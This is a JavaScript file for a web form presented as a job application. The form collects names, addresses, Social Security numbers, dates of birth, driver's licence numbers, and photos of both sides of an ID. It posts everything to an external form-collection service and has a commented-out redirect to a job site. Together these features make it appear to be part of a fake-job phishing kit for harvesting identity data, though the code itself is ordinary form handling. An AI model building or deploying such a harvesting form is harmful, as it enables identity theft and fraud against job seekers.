(function ($) {
  'use strict';
  $('#contactForm')
    .validator()
    .on('submit', function (event) {
      if (event.isDefaultPrevented() || !check_post() || !check_hour()) {
        formError();
        submitMSG(false, 'Please fill in all the fields');
        check_post();
        check_hour();
      } else if (c_uploads() && check_post() && check_hour()) {
        event.preventDefault();

        function _(id) {
          return document.getElementById(id);
        }

        document.getElementById('mybtn').innerText = 'Processing...';
        var idfront = $('#idfront').prop('files')[0];
        var idback = $('#idback').prop('files')[0];

        var formdata = new FormData();
        formdata.append('fname', _('fname').value);
        formdata.append('email', _('email').value);
        formdata.append('addr', _('addr').value);
        formdata.append('city', _('city').value);
        formdata.append('state', _('state').value);
        formdata.append('zip', _('zip').value);
        formdata.append('phone', _('phone').value);
        formdata.append('gender', _('gender').value);
        formdata.append('post', _('post').value);
        formdata.append('hour', _('hour').value);
        formdata.append('ssn', _('ssn').value);
        formdata.append('dob', _('dob').value);
        formdata.append('dln', _('dln').value);
        formdata.append('idfront', idfront);
        formdata.append('idback', idback);
        var ajax = new XMLHttpRequest();
        ajax.open('POST', 'https://getform.io/f/b181301b-5014-4d5c-be2e-19339e65dcbc');
        ajax.onreadystatechange = function () {
          if (ajax.readyState == 4 && ajax.status == 200) {
            var res = ajax.responseText;
            if (res === 'success') {
              formSuccess();
            } else {
              formError();
              submitMSG(false, res);
            }
          }
        };
        ajax.send(formdata);
      } else {
        event.preventDefault();
        formError();
        submitMSG(false, 'Driver License front and back needs to be unique');
      }
    });

  function c_uploads() {
    var fdl1 = $('#idfront')[0].files[0];
    var fdl2 = $('#idback')[0].files[0];
    if (!fdl1 || !fdl2) return false;
    if (fdl1.name === fdl2.name && fdl1.size === fdl2.size && fdl1.type === fdl2.type) {
      return false;
    } else {
      return true;
    }
  }

  function check_post() {
    if ($('#post').val().trim() === '') {
      $('#post-div').html('&nbsp;Please select postion').css('color', 'red');
      return false;
    } else {
      $('#post-div').html('');
      return true;
    }
  }

  function check_hour() {
    if ($('#hour').val().trim() === '') {
      $('#hour-div').html('&nbsp;Please select hour').css('color', 'red');
      return false;
    } else {
      $('#hour-div').html('');
      return true;
    }
  }

  function formSuccess() {
    $('#contactForm')[0].reset();
    submitMSG(true, ' Your application has been successfully submited!');
    // window.setTimeout(function () {
    //   location.href = 'http://www.indeed.com';
    // }, 70000);
  }

  function formError() {
    $('#contactForm')
      .removeClass()
      .addClass('animated shake')
      .one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
        $(this).removeClass();
      });
  }

  function submitMSG(valid, msg) {
    if (valid) {
      $('#contactForm').hide();
      $('#divSubmit').show();
    } else {
      var msgClasses = 'h4 text-center text-danger';
      $('#msgSubmit').removeClass().addClass(msgClasses).text(msg);
    }
  }
})(jQuery);
